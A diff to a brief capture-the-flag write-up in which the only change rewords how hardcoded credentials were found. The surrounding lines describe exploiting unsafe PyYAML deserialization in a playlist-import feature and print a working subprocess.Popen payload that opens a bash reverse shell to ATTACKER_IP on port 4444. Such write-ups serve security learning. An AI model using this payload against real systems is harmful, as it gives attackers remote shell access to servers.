@@ -1,6 +1,6 @@
 Day 5 | Easy • Web • Boot2root
 
-The assessment began by reviewing the exposed source code of the web application, which revealed the hardcoded credentials dj:dj. After logging in, the Import Playlist functionality was identified. The YAML parser was tested with !!python/tuple and !!python/name:os.system, confirming unsafe PyYAML deserialization. Remote Code Execution (RCE) was achieved using the following payload:
+The assessment began by reviewing the application's page source, which revealed the hardcoded credentials dj:dj. After logging in, the Import Playlist functionality was identified. The YAML parser was tested with !!python/tuple and !!python/name:os.system, confirming unsafe PyYAML deserialization. Remote Code Execution (RCE) was achieved using the following payload:
 
 !!python/object/apply:subprocess.Popen
 args: [['/bin/bash', '-c', 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1']]
